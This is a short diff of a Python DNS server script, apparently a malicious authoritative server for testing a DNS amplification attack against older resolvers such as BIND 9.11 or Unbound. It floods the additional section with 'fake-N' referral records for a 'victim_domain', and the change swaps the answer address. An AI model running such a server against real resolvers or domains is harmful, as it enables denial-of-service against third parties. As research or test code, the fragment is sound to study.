@@ -88,7 +88,7 @@ def dns_response(data, client_ip):
                 referral_domain = DomainName('fake-' + str(i) + '.' + victim_domain)
                 reply.add_ar(RR(rname=referral_domain, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP)))
         else:
-            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP)))
+            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
     print("---- Reply:\n", reply)
 
     # install BIND 9.11 or earlier/ Unbound/s
